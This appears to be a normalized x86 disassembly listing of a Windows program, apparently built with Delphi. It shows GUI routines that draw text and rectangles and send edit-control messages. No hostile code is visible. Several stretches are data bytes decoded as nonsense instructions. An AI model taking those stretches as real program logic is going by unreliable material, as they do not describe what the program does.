fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ebx ] cl
dec edi
jo r-xdata
insd
jo r-xdata
cwde
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
jb r-xdata
inc esp
jb r-xdata
cmp al [ eax ]
or cl [ edi + 0x6e ]
adc [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ esi ] al
dec edi
outsb
inc ebp
js r-xdata
add [ eax + 0x4f07003d ] al
add [ eax ] al
ja r-xdata
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or [ edi + 0x6e ] ecx
inc esp
jb r-xdata
jo r-xdata
add bh bh
popad
dec ebp
outsd
jbe r-xdata
dec edi
push ds
inc ebx
add [ eax + 0x2 ] bl
xchg ecx eax
inc ebx
add al ah
add [ eax ] eax
jmp eax
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
popad
je r-xdata
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x93
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bh bh
idiv esp
jmp [ edi + ecx * 4 + 0x5 ]
imul ebp [ esi + 0x67 ] 0x433e6873
add [ edi ] al
andps xmm1 [ ecx + ebp * 2 + 0x73 ]
je r-xdata
outsb
push ebx
je r-xdata
dec edi
jo r-xdata
jo r-xdata
jb r-xdata
pop ebx
inc ebx
add al dl
inc edi
jb r-xdata
call 0xffffffffd8438085
add [ eax ] al
add al bl
dec esp
xchg ecx eax
inc ebx
add al ch
add [ eax ] eax
call 0xffffffffe9423c8a
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070041 ] al
xchg ecx eax
inc ebx
add al bl
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
xchg ebx eax
insd
add al 0x93
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003b ] al
outsb
insb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9423b46
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
push eax
mov edx 0xb9
mov eax esi
call sub_43d908
mov edx 0x69
mov eax esi
outsd
js r-xdata
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0042 ] al
outsb
dec ebp
popad
jae r-xdata
inc ebx
add al ah
add [ eax ] al
jmp eax
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
add [ ebp ] 0x9
dec ecx
je r-xdata
inc ebx
add al al
pop ebp
inc ebx
add [ eax + 0x4e ] ch
inc ecx
add al dh
dec esi
inc ecx
add [ eax + 0x38004360 ] ah
push eax
inc ecx
add al ch
pop ebp
inc ebx
add [ eax + 0x43 ] ch
inc ecx
add [ ebx + eax * 2 + 0x60900041 ] cl
inc ebx
add [ eax ] ah
pop edi
inc ebx
add [ eax ] dh
pop edi
inc ebx
add ah bl
inc edi
inc ecx
add ah dl
pushad
inc ebx
add ah ah
dec ecx
inc ecx
add [ eax - 0x77ffbeb6 ] bh
pop esi
inc ebx
add ah ch
dec edx
inc ecx
add [ ebx + ecx * 2 ] bl
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ eax ] bl
popad
inc ebx
add [ ebp + ecx * 2 + 0x4e0c0041 ] dh
inc ecx
add [ eax + 0xf00414e ] ah
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x53786f42
je r-xdata
inc esp
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
call sub_43d92c
mov eax esi
test bl bl
je r-xdata
je r-xdata
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jb r-xdata
add [ eax + eax ] dl
add [ eax ] al
clc
sbb [ ecx ] eax
fdiv [ eax + eax * 2 ]
add ah ah
xor al 0x40
inc ebx
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
inc ebp
add [ ecx ] cl
inc ecx
add [ ebx + ebx * 2 + 0x5cac0043 ] bh
inc ebx
add [ eax ] dh
dec eax
inc ecx
add [ eax + 0x5d ] al
mov eax eax
aam 0x3d
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi + 0x43 ] dl
add [ ebx + 0x53000408 ] ch
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4409d4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
imul ebp [ esi + 0x67 ] 0x433dd473
add al ah
sbb al [ ecx ]
add [ eax ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
adc al 0x43
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ebp + eax * 2 + 0x41 ] cl
add [ esp + eax * 2 + 0x41 ] al
add al bl
inc esp
outsd
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
call sub_41d67c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d5d8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push ebx
push 0x208838b
add [ eax ] al
insb
jae r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
sub_433e90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_446630
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43d908
mov edx 0x69
mov eax esi
call sub_43d92c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_433eec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4409d4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41d67c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d5d8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_433f58
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4342fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41d67c
call sub_4301bc
call sub_43029c
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d5d8
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43e14c
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412640
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x54 ]
call sub_4042a0
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x58 ]
call sub_4044a0
push eax
mov eax edi
call sub_41d780
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412640
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41cf14
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41cf14
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d328
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41cf14
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41d780
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434301
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_404004
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0x60 ]
call sub_4046c0
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_404004
retn
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d328
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43e14c
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d5bc
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412640
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412640
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_40480c
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43049c
jmp r-xdata
call sub_4301bc
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_430500
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41d780
push eax
call sub_4301bc
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4303a8
push 0x0
mov eax edi
call sub_41d780
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43e14c
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_440460
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x80 ]
call sub_4042a0
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x84 ]
call sub_4044a0
push eax
mov eax edi
call sub_41d780
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41cf14
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x88 ]
call sub_4042a0
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x8c ]
call sub_4044a0
push eax
mov eax edi
call sub_41d780
push eax
call DrawTextA
sub_43430b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434386
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455380
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443dec
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
call sub_444ec8
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43438d
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_4343d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445bb0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43d908
mov edx 0x11
mov eax esi
call sub_43d92c
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_4301bc
call sub_43029c
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_434484
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4345da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_440460
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41d67c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042a8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x160 ]
call sub_41d780
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c728
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x160 ]
call sub_41d780
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c728
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x160 ]
call sub_41d780
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4345e1
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4345eb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_434814
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d030
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41cf14
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41d030
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d2ec
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_40348c
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_40348c
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43470c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41d800
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_40348c
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41d800
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43aed8
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_434850
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_434814
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4348b0
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_40348c
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4348d8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d61c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_43493c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4349c9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4349d0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455380
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_434a20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440694
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43d908
mov edx 0x19
mov eax esi
call sub_43d92c
mov dl 0x1
mov eax esi
call sub_444b9c
xor edx edx
mov eax esi
call sub_43e310
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_43504c
mov eax esi
test bl bl
je r-xdata
sub_434ac8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434b20
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_434b50
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_444c6c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_444968
push eax
call SendMessageA
test eax eax
setne bl
sub_434b88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_444c6c
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_444968
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434bc0
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_434be4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434c04
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_434c34
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_444968
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_444968
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434cec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43e0c0
inc eax
call sub_408734
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_434d76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408748
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43e0d0
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4085ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434d7d
mov eax [ ebp - 0xc ]
call sub_408780
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_434d88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_4040d0
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43e0c0
inc eax
call sub_408734
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434e16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408748
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e0d0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408780
retn
sub_434e24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4417f4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_441720
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
